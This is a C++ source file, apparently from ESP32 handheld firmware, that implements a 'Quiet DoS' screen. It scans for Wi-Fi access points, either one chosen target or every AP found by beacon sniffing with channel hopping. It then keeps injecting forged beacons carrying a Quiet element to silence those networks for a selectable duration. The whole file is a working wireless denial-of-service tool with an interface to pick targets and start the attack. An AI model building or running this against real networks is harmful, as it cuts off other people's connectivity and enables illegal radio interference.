#include "WifiQuietDosScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "utils/network/WifiAttackUtil.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>

// Quiet duration presets, in Time Units (1 TU = 1024 us). Longer = more silence.
static const uint16_t kDur[3]     = {200, 1000, 5000};
static const char*    kDurName[3] = {"Short", "Medium", "Long"};

// ── Static definitions ────────────────────────────────────────────────────
WifiQuietDosScreen::ApEntry WifiQuietDosScreen::_allTargets[MAX_ALL] = {};
int          WifiQuietDosScreen::_allCount = 0;
portMUX_TYPE WifiQuietDosScreen::_allLock  = portMUX_INITIALIZER_UNLOCKED;

WifiQuietDosScreen::~WifiQuietDosScreen()
{
  if (_attacker) { delete _attacker; _attacker = nullptr; }
}

void WifiQuietDosScreen::configureFromChannel(uint8_t channel, const uint8_t* bssid, const char* ssid)
{
  _mode = MODE_TARGET;
  _fromContext = true;
  if (bssid) {
    memcpy(_target.bssid, bssid, 6);
    _target.channel = (channel >= 1 && channel <= 13) ? (int)channel : 1;
    _target.ssid = (ssid && ssid[0]) ? String(ssid) : String("-");
  }
}

void WifiQuietDosScreen::onInit()
{
  if (_fromContext) {
    _startAttack();
    if (_state != STATE_RUNNING) { _fromContext = false; _showMain(); }
    return;
  }
  _showMain();
}

void WifiQuietDosScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MAIN) {
    _mainSel = index;
    if (index == 0) {
      _mode = (_mode == MODE_TARGET) ? MODE_ALL : MODE_TARGET;
      _showMain();
    } else if (_mode == MODE_TARGET) {
      if (index == 1) _selectWifi();
      else if (index == 2) { _durIdx = (uint8_t)((_durIdx + 1) % 3); _showMain(); }
      else if (index == 3) _startAttack();
    } else {  // MODE_ALL
      if (index == 1) { _durIdx = (uint8_t)((_durIdx + 1) % 3); _showMain(); }
      else if (index == 2) _startAttack();
    }
  } else if (_state == STATE_SELECT_WIFI) {
    if (index == 0) { _selectWifi(true); return; }
    const int scanIndex = (int)index - 1;
    if (scanIndex < 0 || scanIndex >= _scanCount) return;
    _target.ssid    = _scanLabels[scanIndex];
    _target.channel = _scanChannels[scanIndex];
    sscanf(_scanValues[scanIndex], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _showMain();
  }
}

void WifiQuietDosScreen::onUpdate()
{
  if (_state != STATE_RUNNING) { ListScreen::onUpdate(); return; }

  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) { _stopAttack(); return; }
  }

  _statusTitle = "Quiet DoS";
  if (_mode == MODE_ALL) {
    _quietAll();
    _statusDetail = (_allCount == 0) ? String("Scanning...") : (String(_allCount) + " APs");
  } else if (_attacker) {
    _attacker->quiet(_target.bssid, _target.ssid.c_str(), _target.channel, 2, 1, kDur[_durIdx], 0);
    _statusDetail = _target.ssid;
  }

  render();
  delay(100);
}

void WifiQuietDosScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI)  _showMain();
  else if (_state == STATE_RUNNING) _stopAttack();
  else                              Screen.goBack();
}

void WifiQuietDosScreen::onRender()
{
  if (_state == STATE_RUNNING) { _drawStatus(_statusTitle.c_str(), _statusDetail.c_str()); return; }
  ListScreen::onRender();
}

void WifiQuietDosScreen::_showMain()
{
  _state = STATE_MAIN;
  _modeSub = (_mode == MODE_TARGET) ? "Target" : "All";
  _durSub  = String(kDurName[_durIdx]) + " (" + String(kDur[_durIdx]) + " TU)";
  _mainItems[0] = {"Mode", _modeSub.c_str()};

  uint8_t itemCount;
  if (_mode == MODE_TARGET) {
    _targetSub = _target.ssid;
    _mainItems[1] = {"Access Point", _targetSub.c_str()};
    _mainItems[2] = {"Duration", _durSub.c_str()};
    _mainItems[3] = {"Start"};
    itemCount = 4;
  } else {
    _mainItems[1] = {"Duration", _durSub.c_str()};
    _mainItems[2] = {"Start"};
    itemCount = 3;
  }

  if (_mainSel >= itemCount) _mainSel = 0;
  setItems(_mainItems, itemCount, _mainSel);
}

void WifiQuietDosScreen::_showScanResults()
{
  _state = STATE_SELECT_WIFI;
  _scanItems[0] = {"Rescan"};
  for (int i = 0; i < _scanCount; i++) {
    _scanItems[i + 1] = {_scanLabels[i], _scanDisplay[i]};
    _scanItems[i + 1].rssi            = _scanRssi[i];
    _scanItems[i + 1].hasRssi         = true;
    _scanItems[i + 1].sublabelMarquee = true;
  }
  setItems(_scanItems, _scanCount + 1);
}

void WifiQuietDosScreen::_selectWifi(bool forceScan)
{
  if (_scanValid && !forceScan) { _showScanResults(); return; }

  _state = STATE_SELECT_WIFI;
  render();
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  WiFi.scanDelete();
  const int total = WiFi.scanNetworks();
  _scanCount = total > MAX_SCAN ? MAX_SCAN : (total > 0 ? total : 0);
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "%s", WiFi.SSID(i).c_str());
    _scanChannels[i] = (uint8_t)WiFi.channel(i);
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s", WiFi.BSSIDstr(i).c_str());
    snprintf(_scanDisplay[i], sizeof(_scanDisplay[i]), "%s CH%u", _scanValues[i], (unsigned)_scanChannels[i]);
    _scanRssi[i] = (int16_t)WiFi.RSSI(i);
  }
  WiFi.scanDelete();
  _scanValid = true;

  if (_scanCount == 0) ShowStatusAction::show("No networks found");
  _showScanResults();
}

void WifiQuietDosScreen::_startAttack()
{
  if (_mode == MODE_TARGET) {
    const MacAddr blank = {0, 0, 0, 0, 0, 0};
    if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
      ShowStatusAction::show("Access Point not set");
      return;
    }
  }

  _state       = STATE_RUNNING;
  _chromeDrawn = false;
  _statusTitle  = "Quiet DoS";
  _statusDetail = (_mode == MODE_ALL) ? String("Scanning...") : _target.ssid;
  render();   // paint before the blocking radio init in the ctor

  _attacker = new WifiAttackUtil();

  if (_mode == MODE_ALL) {
    portENTER_CRITICAL(&_allLock);
    memset(_allTargets, 0, sizeof(_allTargets));
    _allCount = 0;
    portEXIT_CRITICAL(&_allLock);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WifiQuietDosScreen::_beaconCb);
  }
  render();
}

void WifiQuietDosScreen::_stopAttack()
{
  if (_mode == MODE_ALL) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
  }
  if (_attacker) { delete _attacker; _attacker = nullptr; }
  _allChanHop = 0;
  _allCount   = 0;
  ShowStatusAction::show("Stopped", 1000);

  if (_fromContext) { _fromContext = false; Screen.goBack(); }
  else              _showMain();
}

void WifiQuietDosScreen::_quietAll()
{
  if (!_attacker) return;

  ApEntry local[MAX_ALL];
  int count;
  portENTER_CRITICAL(&_allLock);
  memcpy(local, _allTargets, sizeof(_allTargets));
  count = _allCount;
  portEXIT_CRITICAL(&_allLock);

  // Broadcast Quiet beacon per AP (changes channel per AP internally).
  for (int i = 0; i < count; i++) {
    if (!local[i].valid) continue;
    _attacker->quiet(local[i].bssid, "", local[i].channel, 2, 1, kDur[_durIdx], 0);
  }

  // Hop to next scan channel after injecting so _beaconCb keeps discovering.
  _allChanHop = (_allChanHop % 13) + 1;
  _attacker->setChannel(_allChanHop);
}

void WifiQuietDosScreen::_beaconCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT || buf == nullptr) return;
  const auto     pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const size_t   len = pkt->rx_ctrl.sig_len;
  if (len < 10) return;
  const uint8_t fc_sub = (pay[0] >> 4) & 0x0F;
  if (fc_sub != 8) return;  // beacon only
  if (len < 22) return;
  const uint8_t* bssid = pay + 16;
  const uint8_t  ch    = pkt->rx_ctrl.channel;

  portENTER_CRITICAL(&_allLock);
  for (int i = 0; i < _allCount; i++) {
    if (memcmp(_allTargets[i].bssid, bssid, 6) == 0) {
      _allTargets[i].channel = ch;
      portEXIT_CRITICAL(&_allLock);
      return;
    }
  }
  if (_allCount < MAX_ALL) {
    memcpy(_allTargets[_allCount].bssid, bssid, 6);
    _allTargets[_allCount].channel = ch;
    _allTargets[_allCount].valid   = true;
    _allCount++;
  }
  portEXIT_CRITICAL(&_allLock);
}

void WifiQuietDosScreen::_drawStatus(const char* titleLine, const char* detailLine)
{
  auto& lcd = Uni.Lcd;
  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    _chromeDrawn = true;
  }

  const int lineH  = lcd.fontHeight();
  const int labelH = lineH * 2 + 6;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  if (!sp.createSprite(bodyW(), labelH)) return;
  sp.fillSprite(TFT_BLACK);
  sp.setTextSize(1);
  sp.setTextDatum(MC_DATUM);

  const int maxTextW = bodyW() - 8;
  auto fit = [&](String t) -> String {
    if (sp.textWidth(t.c_str()) <= maxTextW) return t;
    while (t.length() > 1 && sp.textWidth((t + "...").c_str()) > maxTextW) t.remove(t.length() - 1);
    return t + "...";
  };

  sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
  sp.drawString(fit(String(titleLine)).c_str(), bodyW() / 2, lineH / 2 + 1);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  sp.drawString(fit(String(detailLine)).c_str(), bodyW() / 2, lineH + lineH / 2 + 5);

  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}
